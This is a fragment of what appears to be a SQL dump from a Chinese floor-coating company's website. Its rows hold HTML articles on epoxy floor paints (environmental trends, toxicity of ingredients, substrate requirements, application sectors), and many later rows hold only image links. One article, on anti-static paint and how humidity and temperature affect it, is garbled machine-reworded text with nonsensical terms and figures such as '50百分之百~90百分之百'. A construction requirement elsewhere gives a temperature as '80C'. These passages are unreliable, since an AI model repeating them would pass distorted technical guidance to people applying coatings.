例如环氧树脂耐磨地坪漆升级产品无溶剂型环保地坪涂料是涂料行业发展的一个很好的方向，并且将可能成为将来涂料发展的主要方向。同是市场出售的木质地板主要有原木地板、复合地板和多层实木复合地板，复合地板中含有大量的甲醛等有毒气体，对身体有一定伤害。</font></p>\r\n<p><br /><font face=\\\"Verdana\\\">　　环氧地坪漆在现代建筑材料中得到广泛应用，如工厂、车库、停车场等。其中综合性能**为优异的水性透气型环氧地坪漆显得尤为突出，随着人们环保观念的增强，水性透气型环氧地坪漆具有以水性化的特点，因此水性透气型环氧地坪漆成为未来地坪漆行业发展趋势。</font></p>\r\n<p><br /><font face=\\\"Verdana\\\">　　现代工业对地坪漆的要求越来越严格，如食品厂、医药等工业要求地坪不起灰、无有害挥发物、防霉抗菌；机械工业要求耐磨损，能长期经受叉车等车辆的辗轧，即使局部损坏也容易维修；机床、仪器仪表等工业车间地面常受到各种油类侵蚀渗漏，难以彻底清除，要求地坪耐油性好；化学工业则要求地坪能耐各种化学介质的腐蚀。此外，现代文明的车间地坪还要求平坦、亮丽、色彩丰富，给人们创造一个良好的工作环境。</font></p>\r\n<p><br /><font face=\\\"Verdana\\\">　　随着涂料技术的飞速发展，地坪涂料的存在就有了其必要性和必然性。据专家介绍，由于材料性能的差异，以环氧树脂为基料的地坪涂料一直成为地坪涂料的主导。传从环保角度来说，传统的溶剂型地坪涂料和无溶剂型地坪涂料虽然基本性能优良，但其中存在许多易挥发性溶剂，施工过程中如果没有做排风处理就会对人体和环境产生不同程度的危害。</font></p>\r\n<p><br /><font face=\\\"Verdana\\\">　　另外由于传统的溶剂型涂料漆膜非常致密、透气性较差，在潮湿的环境下施工容易出现漆膜鼓泡、剥离脱落等现象。而水性透气型环氧地坪的固化性能受湿度影响较小，对潮湿面有很好的粘结强度，同时它能允许水汽渗透而液体不能渗透，能释放水泥内部的气体压力，从根本上解决漆膜鼓泡的毛病。</font></p>\r\n<p><br /><font face=\\\"Verdana\\\">　　地坪漆向环氧地坪漆水性化发展成为必然趋势。专家称，环氧地坪涂料对混凝土等多种底材的附着力优良、固化收缩率低；具有良好的耐水性、耐油性、耐酸碱性、耐盐雾腐蚀等化学特性；同时具有优良的耐磨性、耐冲压性、耐洗刷性等物理特征；在使用时不易产生裂纹且易冲洗、易维修保养。环氧地坪涂料在工业地坪行业占据重要地位，是现代工业较理想的长效地坪涂料品种。水性的环氧树脂地坪漆，必然成为未来地坪漆行业的市场趋势。</font></p>\r\n<p><br /><font face=\\\"Verdana\\\">　　新型的无溶剂型环保地坪涂料是环氧树脂地坪漆的一个全新升级产品，无毒、无味、涂装的整个过程当中无污染，环境好，涂层美观，无缝隙，易清洁打理，防水防潮等优点，填补了环保绿色市场的空白。</font></p>\r\n<p><br /><font face=\\\"Verdana\\\">　　当今社会的生态环境越来恶劣，生态环境的&ldquo;可持续发展&rdquo;已经成为许多国家的发展一个战略，故此，地坪漆生产厂家无溶剂型环保地坪涂料也是地坪涂料的一个发展趋势。地坪漆生产厂家以环境的环保性为主，肩负消费者健康安全的宗旨，同社会一同来共建健康环保绿色城市。</font></p>'),(56,15,'',1,0,0,0,'','','','<p>防静电地坪漆润程度只是在过大的事情状况下才影响地坪涂装，但它的影响要远长远于许多人的假想。相对湿润程度过高，有可能引动涂装外表结露，对于溶剂型胺固化环氧气地坪，凝固水会毁伤固化剂，引动涂膜发白、失光、发黏和回黏。对于聚氨酯地坪，湿润程度太大，容易引动缩孔、起泡等问题。对于无溶剂自流平坦的土地坪，湿润程度太大，很容易引动分色和失光，尤其是在温度也低的时刻。</p>\r\n<p><br /><font face=\\\"Verdana\\\">　　防静电地坪漆渗透剂具备极好的黏着力，渗透力，干燥快，耐磨性强，是具备一定的耐酸、耐碱、耐变色、耐水性、抗冲击的油性液体材料，该产品经过管用渗透，与混凝土地面接触起化学反响效用，使地坪形成一体，并拥塞了地坪的松驰细孔，获得一个无尘细致精密的群体，因此增长地坪的耐磨性、抗压性、细致精密性和抗渗性。彻底解决了质量低劣耐磨地坪，地坪起沙，起尘的疑难问题，更能满意你所需求的地坪颜色形成完全一样，达到严密封闭渗透的理想地坪适合使用范围。</font></p>\r\n<p><br /><font face=\\\"Verdana\\\">　　空气温度太高时，无溶剂自流平坦的土地坪的适合使用期会表面化缩减，地坪很快增稠并干结废弃，甚至于显露出来爆聚现象。因为这个要求小量多次配漆，配好的漆尽量加快倒于地板上，增加散热。溶剂型地坪在高温下还是气流速度大的地方如门跟前、过道等处动工容易显露出来橘皮、皱纹儿、针孔等弊端，是因为溶剂挥发过快引动的，要补加高沸点、低挥发效率的稀释剂调试解决。</font></p>\r\n<p><br /><font face=\\\"Verdana\\\">　　温度过低，低于5℃，很多双组分地坪的固化反响历程怠慢或休止，会严重影响地坪地坪的固化性能，表达为涂膜表干太慢，容易被尘土等杂物污染，影响表观和扮饰效果；固化过程延长，甚至于不可以****固化，涂膜性能严重减低，如强度、硬度减低，耐磨性变差，直接影响运用生存的年限。对于无溶剂自流平坦的土地坪的影响则更大，表达为地坪黏性翻升，流动、流平性能变差，动工时萌生刀痕等欠缺。事情的真实情况上更低的温度，无溶剂环氧气天然树脂自流平坦的土地坪几乎是不可以用的。</font></p>\r\n<p><br /><font face=\\\"Verdana\\\">　　空气中的湿润程度一般用&ldquo;相对湿润程度&rdquo;（RH）来表达，它表达在某一温度时空气中水气的含量，相对湿润程度一般用百分号表达。空气的相对湿润程度普通都在50百分之百~90百分之百之间，当相对湿润程度为100百分之百时，解释明白空气中养分达到****限度，着手结露。按跟平常一样规，相对湿润程度超过85百分之百时，不可以施行涂装作业。在相对湿润程度超过85百分之百时，涂装的涂层品质大多数比较差，容易显露出来泛白、裂纹、剥落等弊端。当然个别特别地坪可以例外，如地坪涂装常用的湿固化型聚氨酯地坪，它是利用大气中的养分施行固化，在其后干燥时，有可能还要加湿，能力使固化正常施行。</font></p>\r\n<p><br /><font face=\\\"Verdana\\\">　　温度和湿润程度对漆膜的影响可谓是地坪制作和涂装务必关切和面临的问题，中心问题是混合溶剂的挥发、随之而来非挥发分的析出。****的形式是保障俩者能够平均蝉联就好。譬如好的混合溶剂可以保障在较宽的温度范围和湿润程度范围内动工，不会有泛白、起皮、起泡、不干。泛白是水汽令高分子过早析出，起皮是溶剂挥发速度大于溶剂的搬迁速度，起泡是起皮的极度化现象，不干，仅只不干而没有以上三者，则动工温度太低。</font></p>\r\n<p><br /><font face=\\\"Verdana\\\">　　加强耐磨性、改善起砂、起尘现象、便于彻底整理、动工便捷，工期短，正常表干3-4钟头，实实在在地做24钟头，隔天可正常行人，走铲车等大型设施需养护1周时间，养护时间越长，硬度和耐磨度越高。车间，厂房，工作室，库房，车库，地下车库的新、旧地坪起到高亮和耐磨的效用。这个对我们的生产有很大的帮助的。</font></p>'),(57,15,'',1,0,0,0,'','','','<p>相信大家也认识，静电地坪漆、环氧树脂地坪、停车场地坪漆、汤谱地坪漆&hellip;&hellip;但是还有一种新的名字，您是否也听过了呢？</p>\r\n<p><br /><font face=\\\"Verdana\\\">　　那就是停车场地坪漆复合材料的到来。</font></p>\r\n<p><br /><font face=\\\"Verdana\\\">　　复合材料具有一系列不可替代的特性，自二次大战以来发展很快。尽管产量小（据法国公司统计，全球复合材料达700万吨），但复合材料的水平已是衡量一个国家或地区科技、经济水平的标志之一。</font></p>\r\n<p><br /><font face=\\\"Verdana\\\">　　复合材料主要由增强材料与基体材料两大部分组成：</font></p>\r\n<p><br /><font face=\\\"Verdana\\\">　　增强材料：在复合材料中不构成连续相，赋于复合材料的主要力学性能，如玻璃钢中的玻璃纤维，CFRP（碳纤维增强塑料）中的碳纤维就是增强材料。</font></p>\r\n<p><br /><font face=\\\"Verdana\\\">　　基体：构成复合材料连续相的单一材料，如玻璃钢（GRP）中的树脂（本文谈到的环氧树脂）就是基体。</font></p>\r\n<p><br /><font face=\\\"Verdana\\\">　　按基体材料不同，复合材料可分为三大类：</font></p>\r\n<p><br /><font face=\\\"Verdana\\\">　　树脂基复合材料</font></p>\r\n<p><br /><font face=\\\"Verdana\\\">　　金属基复合材料</font></p>\r\n<p><br /><font face=\\\"Verdana\\\">　　无机非金属基复合材料，如陶瓷基复合材料、水泥基复合材料、碳基复合材料等。</font></p>\r\n<p><br /><font face=\\\"Verdana\\\">　　那我们为什么采用环氧树脂做基体？这样做的质量会不会受到影响的呢？</font></p>\r\n<p><br /><font face=\\\"Verdana\\\">　　固化收缩率低，仅1%-3%，而不饱和聚酯树脂却高达7%-8%；粘结力强；有B阶段，有利于生产工艺；可低压固化，挥发份甚低；固化后力学性能、耐化学性佳，电绝缘性能良好。</font></p>\r\n<p><br /><font face=\\\"Verdana\\\">　　值得指出的是环氧树脂耐有机溶剂、耐碱性能较常用的酚醛与不饱和聚酯树脂为佳，然耐水性、耐酸性差；固化后一般较脆，韧性较差。</font></p>\r\n<p><br /><font face=\\\"Verdana\\\">　　美、日、西欧水平较高。北美、欧洲的产量分别占全球产量的33%与32%，以中国（含台湾省）、日本为主的亚洲占30%。中国大陆2003年玻璃纤维增强塑料（玻璃纤维与树脂复合的复合材料、俗称&ldquo;玻璃钢&rdquo;）逾100万吨，已居世界第二位（美国2003年为169万吨，日本不足70万吨）。</font></p>'),(58,15,'',1,0,0,0,'','','','地坪工程指作为土建后续适应多种用途需要的特种地面。地坪因适用范围不同而要求各异，主要包括适应车行道、停车场、物流仓库等的高冲击、高耐磨的要求；机械加工车间地面防油渗要求；化工生产耐化学品介质腐蚀的要求；计算机控制室、面粉生产粉尘、纺织业纤维尘、燃料油、易燃易爆危险品储存库地面防止静电积聚的要求；电子元器件生产、手术室、食品医药、精密机械生产装配区域的洁净地面要求等。达到这些要求需专业施工企业规范施工，地坪工程质量关键是要抓好9个关键方面。<br />　　地坪工程的类型按材料可分为2大类：一是耐磨颗粒添加剂型，包括非金属、金属及合金颗粒添加剂型耐磨地面，应用于厂房、停车场、大型超市、人行道以及车行道等，这类工程可以在土建地面工程同期进行；二是高分子聚合物型，包括环氧、聚氨酯、乙烯基酯、丙烯酸酯以及聚脲型等，还可分水性、溶剂型及无溶剂型，据专家介绍，并适合在多种环境条件下施工，可以纤维增强或添加耐磨填料、导静电剂等多层复合，使地面材料具有良好的抗油渗、耐蚀、导静电等性能，其表面有硬质或弹性的特性，适合耐机械划伤或运动场等多种要求。'),(59,15,'',1,0,0,0,'','','','关于地坪涂料的环保性能和毒性，情况如下： 　　<br />一、溶剂型地坪漆主要成份及毒性说明：<br />&nbsp;&nbsp;&nbsp; 1、环氧树脂和固化剂：环氧树脂和固化剂单独时有毒，但它们反应后的固化物可做到无毒，符合FDA无毒要求。<br />&nbsp;&nbsp;&nbsp; 2、颜填料：有些颜填料含有重金属等有毒成份，如铬黄等，有些颜填料无毒，如食品级钛白粉，氧化铁红，氧化铁黄、滑石粉，石英粉等。对于要求干燥后无毒的涂料，可选用无毒的颜填料，不使用含重金属等有毒物质的颜填料，但这样涂料的颜色受到一定限制，一些颜色的成本会升高。<br />&nbsp;&nbsp;&nbsp; 3、溶剂：溶剂大多对人体有害，但溶剂的毒性大小有差别，且在涂膜中的残留程度不同。在施工及漆膜干燥过程中，溶剂挥发对环境及人身有伤害，应尽量选用对人身损害小的溶剂并加强通风以降低浓度。对于干燥后的涂膜，如选用的溶剂残留性低，溶剂基本挥发完毕，对环境及人体无损害。<br />&nbsp;&nbsp;&nbsp; 4、助剂：助剂的量在涂膜中极少，现在毒性大的助剂已不再使用，所以助剂对涂膜的无毒性影响很小。 　　<br />二、无溶剂地坪漆类别、主要成份及毒性说明无溶剂环氧封闭底漆：<br />&nbsp;&nbsp;&nbsp; 1、环氧树脂和固化剂;环氧树脂和固化剂单独时有毒，但它们反应后的固化物基本无毒，符合FDA无毒要求。无溶剂环氧中涂砂浆：环氧树脂和固化剂及石英砂和石英粉组成，环氧树脂和固化剂单独时有毒，但它们反应后的固化物无毒，符合FDA无毒要求；石英粉和石英砂：为天然矿物粉碎筛选后的产物，主要成份为二氧化硅，基本无毒。无溶剂环氧自流平地坪面漆：<br />&nbsp;&nbsp;&nbsp; 1）环氧树脂和固化剂；环氧树脂和固化剂单独时有毒，但它们反应后的固化物无毒，符合FDA无毒要求。<br />&nbsp;&nbsp;&nbsp; 2）颜填料;有些颜填料含有重金属等有毒成份，如铬黄等，有些颜填料无毒，如钛白粉，氧化铁红，氧化铁黄、滑石粉，石英粉等。对于要求干燥后无毒的涂料，可选用无毒的颜填料，不使用含重金属等有毒物质的颜填料，这样涂料的颜色受到一定限制，一些颜色的成本会升高。<br />&nbsp;&nbsp;&nbsp; 3、助剂;助剂的量在涂膜中极少，现在毒性大的助剂已不再使用，所以助剂对涂膜的无毒性影响小。综上所述，地坪涂层完全是可以做到环保无毒的，但不能说现在各厂家的地坪一定无毒，就我所知，目前重金属颜料（如铬黄、氧化铬绿等）在地坪涂料中大量被应用，特别是一些小规模厂家，由于技术力量限制，没有能力解决采用有机颜料易造成的浮色发花问题，加之一些无毒有机及无机颜料价格贵。选用无溶剂底漆、中涂和面涂更易做到（因溶剂型多少会残留溶剂），我公司生产的底涂、中涂都是无溶剂无毒的，如选用无溶剂自流平的面漆，在生产时选用无毒颜料和助剂，即可做到整个涂层无毒。<br />&nbsp;&nbsp;&nbsp; 对于涂层的毒性测试，可委托卫生防疫部门检测，常用检测方法有以下几项：<br />&nbsp;&nbsp;&nbsp; 1、涂层固化后，用涂层粉末做饲喂白鼠试验。<br />&nbsp;&nbsp;&nbsp; 2、用涂料涂刷容器，干燥后清洗，然后装水养金鱼试验。<br />&nbsp;&nbsp;&nbsp; 3、用涂料涂刷容器，干燥后清洗，装蒸馏水浸泡一段时间，然后检测水质是否符合饮用水标准。<br />&nbsp;&nbsp;&nbsp; 4、检测涂层的重金属含量是否超标（可按ASTM961-96A或EN-71标准衡量）。'),(60,15,'',1,0,0,0,'','','','<strong>● 工业地坪设计与参考指南&nbsp;</strong><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1、投资计划：根据建筑物地面设计使用的年限选择择，避免重复建设；&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2、使用表面效果：如平整度、亮度、色泽等；&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3、使用性能：根据建筑物地面设计使用时，满足对生产环境的要求及特殊性能的要求选择，如承重、防尘级<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;别、防静电要求、耐候性能等;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4、使用安全性：如水、油渍及坡道等生产和使用环境中，需要选择择防滑地坪;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5、经济性能：在满足表面效果、使用性能、安全性等要求的情况下，选择合理造价的地坪。&nbsp;<br /><strong>● 基础要求和施工指引</strong>&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;1、混凝土强度要求C25C&nbsp;H&nbsp;(混凝土的拉拔测试不小于2.5Mpa);&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;2、表面密实、无起砂、空鼓、裂缝；&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;3、一楼混凝土地坪需要做防潮处理；&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;4、需用专业地坪工具研磨处理基础地面；&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;5、基层平整度落差应小于2mm；&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;6、基层表面含水率应&lt;6%;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;7、施工环境温度不能低于80C。&nbsp;&nbsp;<br /><strong>● 基础处理的作用及目的：</strong>&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A、通过对地坪基面进行彻底打磨处理（真空吸尘属无尘打磨），去除浮浆和不结实的混凝土表层，要求无空鼓、松散等现象，以保证经久耐用。去除影响涂装的基材表面杂质与污物；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;B、增强涂层与基材的附着力：为涂装地坪涂料提高了基面的平整度，创造较平整表面，以节省涂料用量。进行涂层施工后外观更显漂亮，这对环氧涂层的外观和耐用牢度起关键作用。&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C、不同的基材需采用不同的处理方式，通常需涂装环氧地坪的基材有新建混凝土或水泥砂浆地面、旧漆或油污地面、水磨石地面、PVC地面、大理石或花岗石地面等。'),(61,15,'',1,0,0,0,'','','','地坪在各领域的八大服务范围：<br />● 飞机汽车车间<br />&nbsp;&nbsp;&nbsp; 主要施工地坪有飞机制造车间、飞机维修车间、飞机展示车间，汽车生产车间、汽车维修车间、汽车展示车间，动车、高铁、地铁的制造加工车间，站台运行等区域。<br />● 重型制造车间<br />&nbsp;&nbsp;&nbsp; 随着世界重工业的迅速发展，车间对地面的耐超重要求也越来越高，170吨、200吨、460吨等对地面承载的要求成为必然。如高重物锻压车间，起重机、轧路机等生产、维修车间，坦克等重型武器制造车间。<br />● 药品食品车间<br />&nbsp;&nbsp;&nbsp; 药品、食品和人类的健康息息相关，地面更是加工车间重要的一部分，GMP标准环氧自流平地坪完全适用在药品业制药车间、研究室、抽检室、储存室，食品业生产车间、配备车间、抽检室、储存室等。<br />● 电子化工车间<br />&nbsp;&nbsp;&nbsp; 电子行业产品的高精度性，要求生产车间和储备室等都不能有静电的产生；化工行业的制备车间会有腐蚀性物质的外渐，地面的防腐蚀性尤为重要。<br />● 车库系列地坪<br />&nbsp;&nbsp;&nbsp; 现代发达国家，汽车每年的产量和销售都逐步提升，那么多的汽车，车库的建设无疑也是重要的一块，不管是地下还是露天车库，出入口的防滑性，车位及主通道的美观性都要从地坪上体现出来。<br />● 大堂展厅地坪<br />&nbsp;&nbsp;&nbsp; 四星、五星级酒店的大堂，各级展会、展厅等对地面要求美观、亮丽较高的展区及通道。地坪的艺术展现更是添加了一道亮丽的风景。<br />● 超平地面车间<br />&nbsp;&nbsp;&nbsp; 对地面要求超平的场所，不管你是施工环氧地坪，还是施工耐磨地坪，都要求整体地面超平；比如大型物流仓储间，进出口贸易仓储间，大型变压器。<br />● 健康运动地坪<br />&nbsp;&nbsp;&nbsp; 运动，在当今要求人人健康成长的社会是**重要的一环，无论是室内外蓝球场、足球场、羽毛球场等都需要做地坪，因为地坪的弹性是运动时所必须的；那么公园走道，小区散步场合地面的美观也可通过压花压模地坪实现脚底按摩的功效。'),(62,15,'',1,0,0,0,'','','','<strong>一、机械性能要求</strong><br />主要以下三个方面：<br />1.&nbsp;耐磨性：地坪在使用时会有哪些车辆行走？<br />2.&nbsp;耐压性：地坪在使用时会承受多大荷载？<br />3.&nbsp;耐冲击性：冲击力是否会引起地坪面起壳、剥离？<br /><strong>二、化学性能要求</strong><br />主要考虑以下两个方面：<br />1.&nbsp;耐酸碱性：使用时腐蚀性化学物质的种类及浓度。<br />2.&nbsp;耐溶剂性：使用时溶剂类型及接触时间。<br /><strong>三、楼层位置状况（防水、防潮）</strong><br />根据地坪是在地下楼层还是地面楼层的位置，确定是否需要防潮处理或选择特殊防潮地坪？<br /><strong>四、基面状况</strong><br />1.&nbsp;基层强度：标号C25及以上，一般要求抗压强度&ge;20Mpa；<br />2.&nbsp;平整度：是否需要用环氧砂浆修补？<br />3.&nbsp;湿度、温度：空气湿度&lt;75%，温度不低于5℃。<br /><strong>五、美观要求</strong><br />1.&nbsp;颜色要求：是否需要颜色划分区域？<br />2.&nbsp;亮度要求：是选择哑光还是亮光？<br />3.&nbsp;平整度要求：是否对地坪的平整度有要求？<br /><strong>六、安全性要求</strong><br />如果地坪处在油渍环境或坡道处，则需要选择环氧防腐地坪、环氧防滑地坪。'),(63,15,'',1,0,0,0,'','','','地坪是底层房间与土层相接触的部分，它承受底层房间的荷载，要求具有一定的强度和刚度，并具有防潮、防水、保暖、耐磨的性能。地层和建筑物室外场地有密切的关系，要处理好地坪与平台、台阶及建筑物沿边场地的关系，使建筑物与场地交接明确，整体和谐。<br />&nbsp;&nbsp;&nbsp;&nbsp; 地坪适用于一些对于卫生条件要求比较高的场所比如说医院地面、食品厂车间地面、制药厂车间地面、实验楼地面、机房地面等；要求抗冲压抗腐蚀耐磨的地面比如说地下停车场、工厂库房（过叉车区域）等等。<br />&nbsp;&nbsp;&nbsp;&nbsp; 地坪工程是指作为土建后续适应多种用途需求的特种地面施工工程。地坪按照用途种类划分是**简单的，这种分类从&ldquo;用途需求&rdquo;出发，主要包括：适应车行道、停车场、物流仓库等所需要的高冲击、高耐磨的要求；如机械加工车间地面防油渗要求；化工生产耐化学品介质腐蚀的要求；计算机控制室、面粉生产粉尘、纺织业纤维尘、燃料油、易燃易爆危险品储存库地面防止静电积聚的要求；电子元器件生产、手术室、食品、医药、精密机械生产装配区域的洁净地面要求等，需要由专业施工企业完成的各种特种地面'),(76,21,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/a7421633c7da754e2625e53272dd3e7d.jpg\\\" />'),(77,21,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/e4a20ae1990558b158d7ea46b6a3b377.jpg\\\" />'),(78,21,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/435fb4aa81e010b3256bad6550e677b1.jpg\\\" />'),(79,21,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/c35dcd31146b4f125b4f816f3eed1fef.jpg\\\" />'),(80,21,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/f1c3a9a373bda33b39b6cd5da0c5e18f.jpg\\\" />'),(81,13,'',1,0,0,0,'','','','企业文化企业文化企业文化企业文化企业文化企业文化企业文化企业文化企业文化企业文化企业文化企业文化企业文化企业文化企业文化企业文化企业文化企业文化企业文化企业文化'),(92,14,'',1,0,0,0,'','','','<p align=\\\"center\\\"><img src=\\\"/d/file/f4ec1d7e45be45e2d27538947a5e36d8.jpg\\\" style=\\\"border-width: 0px; border-style: solid; height: 800px; width: 600px;\\\" /><br />&nbsp;</p>\r\n<p align=\\\"center\\\"><img src=\\\"/d/file/9ef5ec9da56e4c9fd32056466bdb53a8.jpg\\\" style=\\\"border-width: 0px; border-style: solid; height: 450px; width: 600px;\\\" /><br />&nbsp;</p>\r\n<p align=\\\"center\\\"><img src=\\\"/d/file/0d8d8fd2f567d3d6644d48f55c8b919b.jpg\\\" style=\\\"border-width: 0px; border-style: solid; height: 800px; width: 600px;\\\" /><br />&nbsp;</p>\r\n<p align=\\\"center\\\"><img src=\\\"/d/file/12dd42a0b3c9ad42c6f1d87617c79021.jpg\\\" style=\\\"border-width: 0px; border-style: solid; height: 800px; width: 600px;\\\" /><br />&nbsp;</p>\r\n<p align=\\\"center\\\"><img src=\\\"/d/file/0b834d33d087aa9e9c35cc1866074730.jpg\\\" style=\\\"border-width: 0px; border-style: solid; height: 450px; width: 600px;\\\" /><br /><br /><img alt=\\\"\\\" src=\\\"/d/file/c1ec51d1eaaa98432fd0a004625f7714.jpg\\\" style=\\\"width: 600px; height: 800px;\\\" /><br /><br /><img alt=\\\"\\\" src=\\\"/d/file/1d38e55974805d6d5d837520f0508d9d.jpg\\\" style=\\\"width: 600px; height: 450px;\\\" /><br /><br /><img alt=\\\"\\\" src=\\\"/d/file/410f9144ca245c44a28833bbcd30360b.jpg\\\" style=\\\"width: 600px; height: 450px;\\\" /><br /><br /><img alt=\\\"\\\" src=\\\"/d/file/0a22176ec97ef5d946f5514c14bf652b.jpg\\\" style=\\\"width: 600px; height: 450px;\\\" /><br /><br /><img alt=\\\"\\\" src=\\\"/d/file/ab26b72c597b7bbf67cad388717d2862.jpg\\\" style=\\\"width: 600px; height: 800px;\\\" /><br /><br /><img alt=\\\"\\\" src=\\\"/d/file/2ab05b0a643240a8dafaec800adfad19.jpg\\\" style=\\\"width: 600px; height: 800px;\\\" /><br /><br /><img alt=\\\"\\\" src=\\\"/d/file/6bf272139f9b54668142412a1b091ecc.jpg\\\" style=\\\"width: 600px; height: 450px;\\\" /><br /><br /><img alt=\\\"\\\" src=\\\"/d/file/d54ec8635cc7f2b2bc94f7f9267fbedb.jpg\\\" style=\\\"width: 600px; height: 800px;\\\" /><br /><br /><img alt=\\\"\\\" src=\\\"/d/file/ece8c644300f640df5c9b96cada29528.jpg\\\" style=\\\"width: 600px; height: 450px;\\\" /></p>'),(93,18,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/31296dfa84551f0fca36ff6f02ece04a.png\\\" />'),(94,18,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/d90bfbfd9fa46e82b4e3d2bfa3d6992c.png\\\" />'),(95,18,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/ad16a75ca2f15c844e116d3371ef3bc1.png\\\" />'),(99,18,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/701201e49e7d074698c59fb8c9342cf9.png\\\" />'),(100,18,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/b9b9d50c7aff30eafc5cf0f194602db0.png\\\" />'),(98,18,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/d9940365a174750369738d11cd85523c.png\\\" />'),(101,11,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/4ae5f90d4bfc61e952beba3cc74f6409.jpg\\\" />'),(102,20,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/fee9bd2464daca04f864a0dae88831f5.jpg\\\" />'),(103,20,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/ec5ecec9b241485dd967eb78f3eba0d5.jpg\\\" />'),(104,20,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/9ec8ca9119018760ffa182c6cc7672bd.jpg\\\" />'),(105,20,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/fc08af9f830ef6ca1cc909e93ecc0293.jpg\\\" />'),(172,22,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/71553116311ed81ce1d7a40f76cb6bd8.jpg\\\" style=\\\"width: 450px; height: 338px;\\\" />'),(173,22,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/c6f0bdd05658aef46b2787ad1af485fc.jpg\\\" style=\\\"width: 450px; height: 338px;\\\" />'),(147,18,'',1,0,0,0,'','','','<p align=\\\"center\\\"><img border=\\\"0\\\" src=\\\"/d/file/1ac6c9b5756439566e0e11bb2eccaffd.jpg\\\" /></p>&nbsp;\r\n<p align=\\\"center\\\"><img border=\\\"0\\\" src=\\\"/d/file/0315d1a31625a7259faa2a87ff717f08.jpg\\\" /></p>&nbsp;\r\n<p align=\\\"center\\\"><img border=\\\"0\\\" src=\\\"/d/file/6ff5331c931884d969dad579b92c3770.jpg\\\" /></p>&nbsp;\r\n<p align=\\\"center\\\"><img border=\\\"0\\\" src=\\\"/d/file/65ff356d12f15d74c2ad4addda58a913.jpg\\\" /></p>&nbsp;\r\n<p align=\\\"center\\\"><img border=\\\"0\\\" src=\\\"/d/file/8595885472f523a767e282071803e223.jpg\\\" /></p>&nbsp;\r\n<p align=\\\"center\\\"><img border=\\\"0\\\" src=\\\"/d/file/cbff1f8ee0b53aacd48c2670bf9f91a3.jpg\\\" /></p>&nbsp;\r\n<p align=\\\"center\\\"><img border=\\\"0\\\" src=\\\"/d/file/8e40a48a3edc0e04e977de72afe5b204.jpg\\\" /></p>&nbsp;\r\n<p align=\\\"center\\\"><img border=\\\"0\\\" src=\\\"/d/file/dd20dafd5ca7b863d3736d4be668490b.jpg\\\" /></p>&nbsp;\r\n<p align=\\\"center\\\"><img border=\\\"0\\\" src=\\\"/d/file/0138f1c72b95faac9aa5f000b2317909.jpg\\\" /></p>&nbsp;\r\n<p align=\\\"center\\\"><img border=\\\"0\\\" src=\\\"/d/file/d3b3d9bd18117024bb63701fd729697a.jpg\\\" /></p>&nbsp;\r\n<p align=\\\"center\\\"><img border=\\\"0\\\" src=\\\"/d/file/02360cd5c2d95453f615946df9839343.jpg\\\" /></p>&nbsp;\r\n<p align=\\\"center\\\"><img border=\\\"0\\\" src=\\\"/d/file/5014248d29c2418f9dbacda0579e92be.jpg\\\" /></p>&nbsp;\r\n<p align=\\\"center\\\"><img border=\\\"0\\\" src=\\\"/d/file/3729a6b6c4cbf38156de6d5e1a0949f4.jpg\\\" /></p>&nbsp;\r\n<p align=\\\"center\\\"><img border=\\\"0\\\" src=\\\"/d/file/5f12eaecc3b339b0a07424b52ac2ada7.jpg\\\" /></p>&nbsp;\r\n<p align=\\\"center\\\"><img border=\\\"0\\\" src=\\\"/d/file/7f8d9b7617dfb76087fecdca5859c68f.jpg\\\" /></p>&nbsp;\r\n<p align=\\\"center\\\"><img border=\\\"0\\\" src=\\\"/d/file/719172eff651283363b2a2128a75d489.jpg\\\" /></p>&nbsp;\r\n<p align=\\\"center\\\"><img border=\\\"0\\\" src=\\\"/d/file/a696e1555f4dcf14a1cc0ede7da640ac.jpg\\\" /></p>&nbsp;\r\n<p align=\\\"center\\\"><img border=\\\"0\\\" src=\\\"/d/file/7b5bd035e5f9cea48142ef43ac480699.jpg\\\" /></p>'),(117,8,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/723aea1744bacaede14fff707af8e3f7.jpg\\\" />'),(118,8,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/e01e6e38be644fcd1bb42f826cb3c6e4.jpg\\\" />'),(174,26,'',1,0,0,0,'','','','<img alt=\\\"\\\" 